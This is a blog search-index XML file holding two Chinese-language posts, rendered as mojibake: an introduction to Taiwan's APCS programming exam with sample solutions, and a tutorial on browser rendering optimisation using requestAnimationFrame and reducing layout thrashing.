<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ç°¡æ˜ APCS å¤§å­¸ç¨‹å¼è¨­è¨ˆå…ˆä¿®æª¢æ¸¬å…¥é–€æ•™å­¸</title>
    <url>/2019/12/15/APCS-%E5%A4%A7%E5%AD%B8%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88%E5%85%88%E4%BF%AE%E6%AA%A2%E6%B8%AC%E5%85%A5%E9%96%80%E6%95%99%E5%AD%B8/</url>
    <content><![CDATA[å‰è¨€APCSï¼ˆAdvanced Placement Computer Scienceï¼Œå¤§å­¸ç¨‹å¼è¨­è¨ˆå…ˆä¿®æª¢æ¸¬å…¥é–€æ•™å­¸ï¼‰æ˜¯æ•™è‚²éƒ¨æ‰€æ¨å‹•çš„è³‡è¨Šèƒ½åŠ›æª¢æ¸¬ï¼Œå¸Œæœ›è—‰ç”±èˆ‰è¾¦å…·å…¬ä¿¡åŠ›ä¹‹ã€Œç¨‹å¼è¨­è¨ˆæª¢æ¸¬ã€ï¼Œè®“å…·å‚™ç¨‹å¼è¨­è¨ˆèƒ½åŠ›ä¹‹é«˜ä¸­è·å­¸ç”Ÿï¼Œèƒ½å¤ æª¢é©—å­¸ç¿’æˆæœï¼Œä¸¦ä¾›ä½œå¤§å­¸é¸æ‰çš„åƒè€ƒä¾æ“šï¼ˆå¯ä»¥æƒ³æˆæ˜¯é¡ä¼¼ç¨‹å¼è¨­è¨ˆç‰ˆæœ¬çš„å…¨æ°‘è‹±æª¢ï¼‰ã€‚å³ä¾¿å¼•èµ·è¨±å¤šè¨è«–å’Œçˆ­è­°ï¼ˆè»Ÿé«”é–‹ç™¼é‡é»åœ¨æ–¼é€éç¨‹å¼èªè¨€é€™é …å·¥å…·è§£æ±ºç”Ÿæ´»ä¸Šçš„å•é¡Œï¼Œéåˆ†å¼·èª¿ç¨‹å¼è§£é¡Œæœ‰å¯èƒ½æœƒæŠ¹ç…å­¸ç”Ÿå­¸ç¿’ç¨‹å¼è¨­è¨ˆçš„ç†±æƒ…æˆ–æ˜¯åŸé„‰å¸«è³‡å·®è·ã€å­¸ç”Ÿå®¶é•·çš„ç„¦æ…®ç­‰ï¼‰ï¼Œä½†ç›®å‰å·²æœ‰è¨±å¤šå¤§å­¸è³‡å·¥è³‡ç®¡ç­‰ç›¸é—œè³‡è¨Šç§‘ç³»é–‹è¨­ç›¸é—œçµ„åˆ¥æˆ–æ˜¯åé¡æ¡è¨ˆæª¢å®šæˆç¸¾ã€‚æœ¬ç¯‡æ–‡ç« é€é APCS é‡‹å‡ºçš„éå»æ­·å±†è€ƒé¡Œä¾†ä»‹ç´¹ APCS ç›¸é—œè³‡è¨Šå’Œè§€å¿µã€‚
APCS ç°¡ä»‹APCS æª¢å®šè©¦é¡Œå…±åˆ†ç‚ºå…©å€‹éƒ¨åˆ†ï¼šç¨‹å¼è¨­è¨ˆè§€å¿µå’Œç¨‹å¼è¨­è¨ˆå¯¦ä½œï¼Œå…©è€…çš†ç‚ºä¸­æ–‡å‘½é¡Œï¼Œæ¡ç·šä¸Šæ–¹å¼é€²è¡Œæ¸¬é©—ã€‚
è€ƒè©¦è³‡è¨Šç¨‹å¼è¨­è¨ˆè§€å¿µé¡Œå…±æœ‰ 40 é¡Œï¼Œåˆ†å…©ç¯€æ¸¬é©—ï¼ˆå„ 20 é¡Œï¼Œå„ 60 åˆ†é˜ï¼‰ï¼Œç¨‹å¼è¨­è¨ˆå¯¦ä½œé¡Œå…±æœ‰ 4 å€‹é¡Œçµ„ï¼ˆ150 åˆ†é˜ï¼‰ã€‚APCS æ¯å¹´å›ºå®šæœ‰å¹¾å€‹æœˆæ™‚é–“æœƒæœ‰è€ƒè©¦æª¢å®šï¼Œåœ¨è¨±å¤šç¸£å¸‚çš†æœ‰è¨­ç½®è€ƒå ´ï¼Œæ¨å»£æœŸé–“å…æ”¶å ±åè²»ã€‚è©³ç´°è€ƒè©¦æª¢å®šè³‡è¨Šä»¥å®˜æ–¹ç¶²ç«™ç‚ºä¸»ã€‚

æˆç¸¾è¨ˆç®—æ–¹å¼ä»¥ä¸‹ç‚ºåˆ†æ•¸èˆ‡ç´šåˆ¥å°ç…§è¡¨ï¼š

æ¸¬è©¦ç’°å¢ƒåœ¨ APCS å®˜æ–¹ç¶²ç«™æœ‰æä¾›å¯¦ä½œç·´ç¿’ç’°å¢ƒå¯ä»¥ä¸‹è¼‰ä½¿ç”¨ï¼ˆéœ€å®‰è£ VirtualBoxï¼‰ï¼ŒæŒ‰ç…§æ­¥é©ŸæŒ‡ç¤ºå¯ä»¥å®‰è£ Ubuntu çš„ç³»çµ±ç’°å¢ƒï¼ˆè£¡é¢å·²ç¶“å®‰è£å¥½ Eclipseã€Code Blockã€Python2&#x2F;3 IDLE ç­‰å·¥å…·ï¼‰ã€‚

ç¨‹å¼è¨­è¨ˆè§€å¿µé¡Œç¨‹å¼è¨­è¨ˆè§€å¿µä¸»è¦æ˜¯å–®é¸é¡Œå‘½é¡Œï¼Œä»¥é‹ç®—æ€ç¶­ã€å•é¡Œè§£æ±ºèˆ‡ç¨‹å¼è¨­è¨ˆè§€å¿µæ¸¬é©—ç‚ºä¸»ã€‚æ¸¬é©—å…§å®¹åŒ…å«ï¼šcode tracingã€code debugging å’Œ code completion ç­‰é¡å‹ï¼ˆç¨‹å¼ç‰‡æ®µä»¥ C èªè¨€å‘½é¡Œï¼‰ã€‚
ç¨‹å¼è¨­è¨ˆè§€å¿µå…§å®¹é ˜åŸŸåŒ…å«ï¼š

ç¨‹å¼è¨­è¨ˆåŸºæœ¬è§€å¿µ
è³‡æ–™å‹åˆ¥ã€è®Šæ•¸ï¼ˆå…¨åŸŸè®Šæ•¸ã€å€åŸŸè®Šæ•¸ï¼‰ã€å¸¸æ•¸
æ¢ä»¶æ§åˆ¶
è¿´åœˆ
å‡½å¼
é™£åˆ—ã€çµæ§‹ç­‰è³‡æ–™çµæ§‹
éè¿´

ä»¥ä¸‹æˆ‘å€‘æ ¹æ“šå®˜ç¶²æä¾›çš„æ­·å±†è©¦é¡Œï¼Œç”¨å…©å€‹ç¯„ä¾‹ä¾†è®“è®€è€…æ„Ÿå—ä¸€ä¸‹ç¨‹å¼è¨­è¨ˆè§€å¿µé¡Œã€‚

æœ¬é¡Œåƒè€ƒè§£ç­”ç‚ºï¼šDï¼Œä¸»è¦æ˜¯æ¸¬é©—å¾ªåºæœå°‹æ³•åŠäºŒåˆ†æœå°‹æ¼”ç®—æ³•çš„æ¯”è¼ƒã€‚
è§£é¡Œæ€è·¯ï¼š
value = 100 ä»£è¡¨ k ç‚º 33ï¼Œå¾ªåºå¾ 0 åˆ° 33 éœ€åŸ·è¡Œ 34 æ¬¡ã€‚
è‹¥é€éäºŒåˆ†æœå°‹ç®—æ³•ï¼Œæ¯æ¬¡å°åˆ‡æœƒæ›´é€¼è¿‘ç­”æ¡ˆï¼Œå¯ä»¥åœ¨ç¬¬ 5 æ¬¡æ™‚æ‰¾åˆ°ã€‚




low
high
mid



No.1
0
99
49


No.2
0
48
24


No.3
25
48
36


No.4
25
35
30


No.5
31
35
33


æ¥è‘—æˆ‘å€‘å†ä¾†çœ‹å¦å¤–ä¸€å€‹ç¯„ä¾‹ï¼š

æœ¬é¡Œåƒè€ƒè§£ç­”ç‚ºï¼šCã€‚ä¸»è¦å¸Œæœ›é€éè¿´åœˆæ‰¾åˆ°æœ€å¤§å…ƒç´ å€¼çš„ç´¢å¼•å€¼ã€‚æœ€å¤§å€¼ç‚º 9ï¼Œä½†å–æœ€å¾Œä¸€æ¬¡å€¼å‡ºç¾ 9 çš„ index ç‚º 7ã€‚
ç¨‹å¼è¨­è¨ˆå¯¦ä½œé¡Œç¨‹å¼è¨­è¨ˆå¯¦ä½œé¡Œä¸»è¦ä»¥å®Œæˆç¨‹å¼ç‚ºä¸»ï¼Œå¯ä»¥è‡ªè¡Œé¸æ“‡ä»¥ Cã€C++ã€Java æˆ– Python æ’°å¯«ç¨‹å¼ã€‚æˆ‘å€‘ç¯„ä¾‹å°‡ä»¥ Python ç‚ºä¸»ã€‚
ä»¥ä¸‹æˆ‘å€‘æ ¹æ“šå®˜ç¶²æä¾›çš„æ­·å±†è©¦é¡Œï¼Œç”¨ä¸€å€‹ç¯„ä¾‹ä¾†è®“è®€è€…æ„Ÿå—ä¸€ä¸‹ç¨‹å¼è¨­è¨ˆå¯¦ä½œé¡Œã€‚


æœ¬é¡Œè§£é¡Œæ€è·¯ä¸»è¦åˆ†ç‚ºï¼š

è¼¸å…¥è³‡æ–™å‰è™•ç†
é€²è¡Œæˆç¸¾è³‡æ–™çš„æ’åº
åˆ¤æ–·æœ€ä½åˆ†æ˜¯å¦åŠæ ¼ï¼šè‹¥åŠæ ¼ä»£è¡¨å…¨éƒ¨äººéƒ½åŠæ ¼ï¼Œå¦å‰‡å¾ªåºå–å‡ºæœ€é«˜ä¸åŠæ ¼åˆ†æ•¸
åˆ¤æ–·æœ€é«˜åˆ†æ˜¯å¦ä¸åŠæ ¼ï¼šè‹¥ä¸åŠæ ¼å‰‡å…¨ç­ä¸åŠæ ¼ï¼Œå¦å‰‡å¾ªåºå–å‡ºæœ€ä½åŠæ ¼åˆ†æ•¸

while True:    input_line_1 = input(&#x27;è«‹è¼¸å…¥å­¸ç”Ÿäººæ•¸ï¼š&#x27;)    if not input_line_1:        print(&#x27;è«‹è¼¸å…¥æ­£ç¢ºå­¸ç”Ÿäººæ•¸&#x27;)        break    try:        student_number = int(input_line_1)    except ValueError:        print(&#x27;è«‹è¼¸å…¥æ­£ç¢ºå­¸ç”Ÿäººæ•¸&#x27;)        break    input_line_2 = input(&#x27;è«‹è¼¸å…¥å­¸ç”Ÿæˆç¸¾ï¼š&#x27;)    if not input_line_2:        print(&#x27;è«‹è¼¸å…¥å­¸ç”Ÿæˆç¸¾&#x27;)        break    raw_score_list = input_line_2.split(&#x27; &#x27;)    if len(raw_score_list) != student_number:        print(&#x27;è«‹ç¢ºèªæˆç¸¾ç­†æ•¸æ˜¯å¦æ­£ç¢º&#x27;)        break    # ç”±å°åˆ°å¤§æ’åº    sorted_score_list = sorted(raw_score_list)    sorted_score_str = &#x27; &#x27;.join(sorted_score_list)    print(sorted_score_str)    sorted_score_list = [int(value) for value in sorted_score_list]    # ç”±æ–¼ç”±å°åˆ°å¤§æ’åºï¼Œè‹¥ç¬¬ä¸€å€‹å€¼ä¹ŸåŠæ ¼ä»£è¡¨å…¨ç­éƒ½åŠæ ¼    if sorted_score_list[0] &gt;= 60:        print(&#x27;best case&#x27;)    else:        # å¾ªåºå–å‡ºæœ€é«˜ä¸åŠæ ¼åˆ†æ•¸        i = student_number - 1        while sorted_score_list[i] &gt;= 60:            i -= 1        print(sorted_score_list[i])    # ç”±æ–¼ç”±å°åˆ°å¤§æ’åºï¼Œè‹¥æœ€å¾Œä¸€å€‹æˆç¸¾ï¼ˆæœ€é«˜åˆ†ï¼‰ä¹Ÿä¸åŠæ ¼ä»£è¡¨å…¨ç­éƒ½ä¸åŠæ ¼    if sorted_score_list[-1] &lt; 60:        print(&#x27;worst case&#x27;)    else:        # å¾ªåºå–å‡ºæœ€ä½åŠæ ¼åˆ†æ•¸        i = 0        while sorted_score_list[i] &lt; 60:            i += 1        print(sorted_score_list[i])

ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹äº† APCS å¤§å­¸ç¨‹å¼è¨­è¨ˆå…ˆä¿®æª¢æ¸¬ç›¸é—œè³‡è¨Šã€‚é›–ç„¶ APCS å¯ä»¥é€éè€ƒè©¦æª¢å®šæ–¹å¼å…·æ›´å…·é«”åŒ–å‘ˆç¾å­¸ç”Ÿå°æ–¼ç¨‹å¼è§£é¡Œçš„æ¦‚å¿µï¼ˆç•¢ç«Ÿè€ƒè©¦æ¸¬é©—æ˜¯æˆæœ¬æœ€ä½ä¹Ÿçœ‹ä¼¼å…¬å¹³çš„æª¢é©—èƒ½åŠ›æ–¹å¼ï¼‰ï¼Œæ”¿åºœå–®ä½é¡˜æ„é‡è¦–è³‡è¨Šç§‘æŠ€æ•™è‚²ä¹Ÿæ˜¯å¥½äº‹ä¸€ä»¶ï¼Œä¹Ÿè®“å°ˆæ”»ç¨‹å¼è¨­è¨ˆèƒ½åŠ›å°ˆé•·çš„å­¸ç”Ÿæœ‰å¤šä¸€å€‹å‡å­¸çš„ç®¡é“ã€‚ä½†åœ¨è€ƒè©¦é ˜å°æ•™å­¸çš„æ•™è‚²ç’°å¢ƒä¸‹ï¼Œè‹¥æ˜¯æ²’æœ‰å¾ˆå¥½çš„é…å¥—æ•™å­¸æªæ–½å¯èƒ½å®¹æ˜“è®“è˜è˜å­¸å­èª¤ä»¥ç‚ºç¨‹å¼è¨­è¨ˆå’Œè»Ÿé«”é–‹ç™¼å°±æ˜¯ç¨‹å¼è§£é¡Œæˆ–æ˜¯æ‹šå‘½åˆ·é¡Œï¼Œå¾è€Œæ”¾æ£„äº†å°æ–¼ç¨‹å¼è¨­è¨ˆçš„ç†±æƒ…å°±å¾—ä¸å„Ÿå¤±äº†ï¼ˆé‚è¼¯æ€è€ƒå’Œè§£æ±ºå•é¡Œèƒ½åŠ›å¾ˆé‡è¦ï¼Œä½†è»Ÿé«”é–‹ç™¼æœ€é‡è¦çš„é‚„æ˜¯äººçš„éƒ¨åˆ†ä»¥åŠè·¨é ˜åŸŸæºé€šå”èª¿å’Œæ•´åˆï¼‰ã€‚
åƒè€ƒæ–‡ä»¶
APCS å®˜æ–¹ç¶²ç«™

]]></content>
  </entry>
  <entry>
    <title>Browser Rendering Optimization</title>
    <url>/2016/04/02/Browser-Rendering-Optimization/</url>
    <content><![CDATA[
â€œMy name is Barry Allen, and Iâ€™m the fastest man alive â€¦â€â€œWait..reverse flash is faster then you, zoom is faster than you..â€



ä»Šå¤©ä¾†è«‡è«‡Browser Rendering Optimisationã€‚
ç›¸ä¿¡å¤§å®¶å°æ™‚å€™éƒ½å¥½å¥‡éæ—©æœŸçš„é›»å½±ã€å¡é€šæˆ–å‹•ç•«ï¼Œæ˜¯æ€éº¼æ¨£è£½ä½œå‡ºä¾†çš„ï¼Œè€Œæˆ‘å€‘ä¹Ÿéƒ½çŸ¥é“åŸºæœ¬ä¸Šå°±æ˜¯ä¸€é€£ä¸²çš„ç•«é¢ä»¥éå¸¸å¿«é€Ÿçš„æ–¹å¼åšåˆ‡æ›ï¼ŒçŸ‡é¨™ä½ çš„è¦–è¦ºè®“ä½ æ„Ÿå—åˆ°æ˜¯é€£çºŒçš„å½±ç‰‡ï¼Œè€ŒBrowserå…¶å¯¦ä¹Ÿæ˜¯é¡ä¼¼çš„åšæ³•ï¼Œç•¶å–å¾—Serverçš„å›æ‡‰å¾Œï¼Œç€è¦½å™¨ä¾¿æŠŠæ¥æ”¶åˆ°çš„HTMLç•«å‡ºä¾†ï¼Œè€Œæ¯ç•¶ä½ çš„ç¶²é æœ‰æ‰€è®ŠåŒ–æ™‚ï¼ŒBrowserå°±æœƒå†ä¾æ“šå…¶é‚è¼¯å°‡ç¶²é é‡æ–°æ¸²æŸ“ä¸€éï¼Œä¹Ÿå› æ­¤æ‰èƒ½çœ‹åˆ°é€™éº¼å¤šæ¼‚äº®çš„æ•ˆæœã€‚
è€Œæ‰€è¬‚browser rendering optimizationå°±æ˜¯è¦è®“æ¸²æŸ“çš„éç¨‹èƒ½å¤ æ›´å¿«é€Ÿã€æ›´é †æš¢ï¼Œè®“ä½ çš„ç¶²é ç•«é¢å¦‚å¤¢ä¼¼å¹»ã€ç´°ç·»è€€çœ¼ã€‚
è¦åšåˆ°é€™ä»¶äº‹æƒ…ï¼Œå°±å¿…é ˆæåŠFPS(Frames per Second)ï¼Œé¡§åæ€ç¾©å°±æ˜¯æ¯ç§’ç•«å¹¾å€‹Framesï¼Œä¸€èˆ¬å½±ç‰‡å¤§æ¦‚æ˜¯30fpsï¼Œè€Œå¤šæ•¸è¢å¹•ç•«é¢çš„æ›´æ–°é »ç‡æ˜¯60Hzï¼Œå› æ­¤è‹¥æˆ‘å€‘èƒ½å°‡fpsæ¥µè‡´æå‡åˆ°60fpsï¼Œç†ç•¶èƒ½æœ‰éå¸¸æ£’çš„ç•«é¢å‘ˆç¾ï¼
çŸ¥é“ç›®æ¨™å¾Œï¼Œletâ€™s do some mathâ€¦60fps = 60 frames per second = 60 frames every 1000mså¥½çš„å¾æˆ‘å€‘å„ªç•°çš„æ•¸å­¸èƒ½åŠ›ä¸‹å¾—çŸ¥ï¼Œè¦é”åˆ°60fpsï¼Œæˆ‘å€‘ç¹ªè£½ä¸€å€‹framesçš„æ™‚é–“å¿…é ˆåœ¨16.6666â€¦mså·¦å³(1000&#x2F;60)
okï¼Œé‚£è¦æ€éº¼çŸ¥é“è‡ªå·±çš„ç¶²é æ¯å€‹framesèŠ±äº†å¤šå°‘æ™‚é–“ç¹ªè£½ï¼Ÿæ‹œGoogleå¤§ç¥æ‰€è³œï¼Œåªè¦æ‰“é–‹Chromeçš„devToolï¼Œåˆ‡æ›åˆ°Timelineçš„tabï¼Œå°±å¯ä»¥å¾ˆå®¹æ˜“çš„çŸ¥é“ç¶²é åœ¨browserä¸Šçš„renderæ™‚é–“ã€‚è®“æˆ‘å€‘ç”¨ç•«é¢è¶…ç´šold schoolçš„pchomeæ‹è³£ä¾†Demoä¸€ä¸‹ï¼š

å…ˆåˆ¥è¢«åœ–ä¸­äº”é¡å…­è‰²çš„å€å¡Šåš‡åˆ°ï¼Œåœ¨æˆ‘å€‘èªªæ˜é€™Toolè©²å¦‚ä½•ä½¿ç”¨ä¹‹å‰ï¼Œå¿…é ˆå…ˆç­è§£Browserçš„Renderéç¨‹ï¼Œä»¥åŠé€™åœ–ç‰‡ä¸­æ¯å€‹é¡è‰²æ‰€ä»£è¡¨çš„æ„ç¾©ã€‚
æ¥è§¸éHTMLçš„äººä¸€å®šéƒ½çŸ¥é“æ‰€è¬‚çš„DOM Treeï¼ŒBrowseræœƒè§£æHTMLä¸¦è½‰æ›æˆDOM Treeåšæ“ä½œï¼Œä½†çŸ¥é“Render Treeçš„äººå¯èƒ½å°±ä¸å¤šäº†ï¼ŒRender treeç”±DOM treeèˆ‡CSSçµåˆç”¢ç”Ÿï¼ŒBrowserå°±æ˜¯ä¾ç…§Render Treeä¾†æ±ºå®šè©²åœ¨ç•«é¢ä¸Šå‘ˆç¾ä»€éº¼æ±è¥¿ã€‚è‹¥ä½ ä»Šå¤©åœ¨æŸå€‹divçš„cssä¸ŠåŠ ä¸Šdisplay: noneï¼Œé‚£é€™å€‹divå°±ä¸æœƒå†Render treeä¸Šå‘ˆç¾ã€‚

æ—¢ç„¶Renderçš„éç¨‹ä¹Ÿæ˜¯ä¸€æ£µTreeï¼Œæœ‰é»æ¦‚å¿µçš„äººå¯èƒ½æœƒæƒ³ï¼šæ¯æ¬¡styleæ”¹è®Šæˆ–æ˜¯æˆ‘æ›´å‹•DOMçš„ä½ç½®æ™‚ï¼Œé€™æ£µTreeä¹Ÿå°±æœƒè®Šå‹•äº†å§ï¼Ÿæ²’éŒ¯ï¼åœ¨æ•´å€‹Browserçš„Renderéç¨‹ä¸­ï¼Œå°±æ˜¯æœƒä¸æ–·å»recalculating styleã€layoutçš„é—œä¿‚ï¼Œä¾†å»ºæ§‹é€™æ£µæ¨¹ã€‚
ç•¶ç„¶Browserçš„æ¸²æŸ“éç¨‹ä¸æ­¢é€™äº›ï¼Œé‚„å¿…é ˆè¼‰å…¥js, css, web apiç­‰ç­‰çš„è³‡æºï¼Œå› æ­¤æœ‰æ‰€è¬‚çš„Rendering Pipeline
å¾åœ–ä¸Šå¯ä»¥ç™¼ç¾å…¶é †åºç‚ºï¼š

Javascript: è¼‰å…¥èˆ‡åŸ·è¡ŒJS&#x2F;CSS
Style: æ ¹æ“šjsèˆ‡cssè¨ˆç®—style
Layout: ç•¶styleå¥—å…¥å…ƒç´ æ™‚ï¼Œç€è¦½å™¨è¦æª¢æŸ¥æ˜¯å¦æœƒå½±éŸ¿åˆ°æ•´å€‹ç•«é¢çš„æ’åˆ—ï¼Œä¸¦é€²è¡Œæ’åˆ—
Paint: æ’åˆ—å¾Œæœ‰æ›´å‹•åˆ°çš„å…ƒç´ éœ€è¦é‡æ–°ç¹ªè£½ï¼ˆç¬¬ä¸€æ¬¡è¼‰å…¥çš„è©±ç•¶ç„¶æ˜¯å…¨éƒ¨ç¹ªè£½ï¼‰
Composite: æœ€å¾Œå°±æ˜¯å°‡æ‰€æœ‰å…ƒç´ é‡æ–°åˆæˆå›ä¾†ï¼ˆé‡æ–°ç¹ªè£½çš„å…ƒç´ èˆ‡åŸæœ¬çš„å…ƒç´ ï¼‰

å¯¦éš›ä¸Šä¸¦éæ¯æ¬¡çš„å‰ç«¯æ›´å‹•éƒ½æœƒåŸ·è¡Œé€™äº”å€‹æ­¥é©Ÿï¼Œè‹¥ä½ åªæœ‰åˆ‡æ›é¡è‰²ã€åœ–ç‰‡ç­‰ä¸å½±éŸ¿ç‰ˆé¢é…ç½®çš„å‹•ä½œï¼Œbrowseræœƒè·³éLayoutï¼Œç›´æ¥é€²è¡ŒPaintï¼›æˆ–è‘—ä½ æ²å‹•ç¶²é ã€cssçš„å‹•ç•«æ•ˆæœï¼Œé€™é¡æ“ä½œå‰‡æœƒè·³éstyleèˆ‡layoutï¼Œç›´æ¥é€²è¡ŒCompositeã€‚
æ¥ä¸‹ä¾†æˆ‘å€‘å›åˆ°Timelineé€™å€‹toolã€‚
ä½ å¯ä»¥ç›´æ¥åœ¨ä½ æƒ³è§€å¯Ÿçš„ç¶²é æ‰“é–‹Timelineï¼Œä¸¦é‡æ–°æ•´ç†ï¼Œä»–å°±æœƒè‡ªè¡ŒéŒ„è£½ï¼›æˆ–æ˜¯ä½ å¯ä»¥åœ¨ä½ æƒ³è§€å¯Ÿçš„æ“ä½œæ­¥é©Ÿé€²è¡Œå‰ï¼ˆex. æ»‘å‹•é é¢ã€æ‰“é–‹menu barç­‰ç­‰ï¼‰æŒ‰ä¸‹éŒ„è£½ã€‚

æ¥è‘—åœ¨ä½ è¦ºå¾—é©åˆçš„åœ°æ–¹ï¼ˆé€šå¸¸å°±æ˜¯æ­¥é©ŸåŸ·è¡Œå®Œå¾Œï¼‰æŒ‰ä¸‹Finishã€‚

åŸºæœ¬ä¸Šå°±èƒ½å¾—åˆ°ä¸‹åˆ—çš„Timelineçµæœã€‚å¾é€™å¼µåœ–ç‰‡å¯ä»¥æ¸…æ¥šçœ‹åˆ°æ¯å€‹frameèŠ±äº†å¤šå°‘æ™‚é–“ï¼Œåœ¨Render pipelineä¸­ç™¼ç”Ÿäº†å“ªäº›äº‹æƒ…ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ–ç‰‡å³ä¸Šè§’æœ‰å€‹ç´…è‰²å°ä¸‰è§’å½¢ï¼Œè‹¥ä½ çš„frameä¸­æœ‰é€™å€‹æ¨™è¨˜ï¼Œå°±ä»£è¡¨Chromeèªç‚ºé€™æ®µframeæœ‰å¯ä»¥æ”¹å–„çš„éƒ¨åˆ†ã€‚å¤§å®¶ä¸å¦¨åˆ°è‡ªå·±çš„ç¶²é æ‰“é–‹Timelineï¼Œçœ‹çœ‹æœ‰å¤šå°‘æ±è¥¿éœ€è¦æ”¹é€²XD
åœ¨èªè­˜äº†å·¥å…·å¾Œï¼Œç¸½æ˜¯è¦å¯¦éš›æ“ä½œä¸€éæ‰æœƒæœ‰æ„Ÿå—ï¼Œé€™é‚Šä»¥ä¸‰ç¨®è§’åº¦ä¾†é€²è¡ŒOptimizationã€‚
Javascriptä¸€èˆ¬ä¾†èªªï¼Œå‰ç«¯å·¥ç¨‹å¸«å¸¸å¸¸æœƒåˆ©ç”¨setTimeoutæˆ–æ˜¯setIntervalä¾†è£½ä½œä¸€äº›å‹•ç•«æ•ˆæœï¼Œä½ å¯èƒ½æœƒå¯«ä¸‹é¢é€™æ¨£çš„code:
example setInterval
setInterval.jsvar timer = &#123;time: 0&#125;;function counter(timer) &#123;   timer.time = timer.time+1;  document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;&#125;setInterval(counter.bind(null,timer), 1000); 

æˆ–è‘—æ˜¯
example setTimeout
setTimeout.jsvar timer = &#123;time: 0&#125;;function counter(timer) &#123; 	setTimeout(counter.bind(null,timer), 1000);	timer.time = timer.time+1;	document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;&#125;counter(timer);
å…©è€…éƒ½å¯ä»¥è®“ä½ é”åˆ°åŒæ¨£çš„æ•ˆæœï¼Œä½†æ˜¯setTimeoutè·ŸsetIntervalå°Browserä¾†èªªéƒ½æœ‰å€‹ä¸»è¦ç¼ºé»ï¼Œå°±æ˜¯ä»–**æƒ³åŸ·è¡Œæ™‚å°±æœƒåŸ·è¡Œï¼Œè€Œä¸æœƒä¾æ“šä½ çš„Browserç‹€æ³**ï¼›å¦å¤–ç•¶ä½ åˆ‡æ›åˆ°åˆ¥çš„Tabæ™‚ï¼ŒsetTimeouté‚„æœƒç¹¼çºŒRenderã€‚ï¼ˆç†è«–ä¸Šuserçœ‹ä¸åˆ°ç•«é¢ï¼ŒBrowserå°±å¯ä»¥ä¸ç”¨åŸ·è¡Œï¼Œä»¥ç¯€çœæ•ˆèƒ½ï¼‰ä¸éç¾åœ¨è¨±å¤šç€è¦½å™¨éƒ½å·²ç¶“åˆ©ç”¨æŸäº›æ–¹å¼è®“setTimeoutåœ¨ä¸éœ€è¦Renderæ™‚æš«åœå·¥ä½œã€‚
é™¤äº†setTimeoutèˆ‡setIntervalå¤–ï¼Œæˆ‘å€‘å…¶å¯¦é‚„æœ‰å¦ä¸€å€‹é¸æ“‡ requestAnimationFrame
å‡è¨­æˆ‘å€‘æœ‰å€‹Drawçš„å‹•ç•«functionï¼Œç”¨setTimeoutæ˜¯é€™æ¨£å¯¦ä½œï¼š
draw.jsfunction draw() &#123;    setTimeout(draw, 16); // 16ms per frame!    // Drawing&#125;draw();
è‹¥æ˜¯ç”¨requestAnimationFrameï¼š
draw-RAF.jsfunction draw() &#123;	// Drawing	requestAnimationFrame(draw);&#125;requestAnimationFrame(draw);
å°±é€™éº¼ç°¡å–®ï¼Œç”¨äº†requestAnimationFrameä¹‹å¾Œï¼ŒBrowserå°±æœƒç¶œåˆè€ƒé‡javascriptæ‰€ç”¢ç”Ÿçš„å‹•ç•«ï¼Œä¸€èµ·åˆ·æ–°è¢å¹•ï¼Œä¸¦åœ¨å‹•ç•«ä¸åœ¨viewportæ™‚ï¼Œæš«åœå·¥ä½œï¼Œä»¥ç¯€çœè³‡æºã€‚
ç•¶ç„¶ä½ æœƒæƒ³èªªï¼Œé‚£å¦‚æœæˆ‘æƒ³æ§åˆ¶animationçš„timingæ€éº¼è¾¦ï¼Ÿä»¥å‰é¢çš„counterä¾‹å­ä¾†çœ‹ï¼Œä½ å¯ä»¥é€™æ¨£åšï¼š
example reqeustAnimationFrame
RAF_timeervar timer = &#123;time: 0&#125;;function counter(timer) &#123;   setTimeout(function()&#123;    requestAnimationFrame(counter.bind(null, timer));    timer.time = timer.time+1;    document.querySelector(&quot;#counter&quot;).innerHTML = timer.time;  &#125;, 1000);&#125;counter(timer);
Style &amp; Layouté™¤äº†JSå¤–ï¼Œåœ¨é é¢ä¸Šæ“ä½œç•«é¢å¤§å¤šå…ä¸äº†è§¸ç™¼Style &amp; Layouté€™å…©å€‹Render Pipelineçš„æ­¥é©Ÿã€‚æ—¢ç„¶å…ä¸äº†é€™äº›æ­¥é©Ÿï¼Œæˆ‘å€‘èƒ½åšçš„å°±æ˜¯ç›¡é‡æ¸›å°‘é€™äº›æ­¥é©Ÿçš„ç”¢ç”Ÿï¼Œå¤§å®¶å¯ä»¥åˆ°é€™è£¡ï¼ˆHow (not) to trigger a layout in WebKitï¼‰çœ‹çœ‹åœ¨æœ‰å“ªäº›æ“ä½œæˆ‘å€‘è¦ç›¡é‡æ¸›å°‘ã€‚
ç•¶ç„¶ï¼Œå…‰èªªä¸ç·´æ„Ÿå—ä¸åˆ°å·®åˆ¥ï¼Œè®“æˆ‘å€‘ä¾†ç·´ç¿’ä¸€å€‹ä¾‹å­ï¼š
example Layout trigger
befor-optimization.js(function() &#123;  // noprotect  var sizer = document.querySelector(&#x27;.sizer&#x27;);  document.querySelector(&#x27;.set-size&#x27;).addEventListener(&#x27;click&#x27;, function(event) &#123;    var ps = document.querySelectorAll(&#x27;.article .article-block&#x27;);    var i = ps.length;    var size;    while (i--) &#123;      finalHeight = sizer.offsetHeight;      ps[i].style.height = finalHeight + &#x27;px&#x27;;    &#125;    event.preventDefault();  &#125;);&#125;());
example Less Layout trigger
after-optimization(function() &#123;  // noprotect  var sizer = document.querySelector(&#x27;.sizer&#x27;);  document.querySelector(&#x27;.set-size&#x27;).addEventListener(&#x27;click&#x27;, function(event) &#123;    var ps = document.querySelectorAll(&#x27;.article .article-block&#x27;);    var i = ps.length;    var size;    var finalHeight = sizer.offsetHeight;    while (i--) &#123;      ps[i].style.height = finalHeight + &#x27;px&#x27;;    &#125;    event.preventDefault();  &#125;);&#125;());
ä»”ç´°çœ‹å°±æœƒç™¼ç¾å…¶å¯¦åªæœ‰ä¸€è¡Œcodeæœ‰è®Šå‹•ï¼Œæ•ˆæœå»å·®å¾ˆå¤šï¼ç•¶ä½ åœ¨æ“ä½œé¡ä¼¼DOMç‰©ä»¶çš„æ™‚å€™å¯ä»¥åƒè€ƒä¸Šè¿°çš„ç¶²ç«™ï¼Œé¿å…ä¸å¿…è¦çš„re-layoutå‹•ä½œã€‚
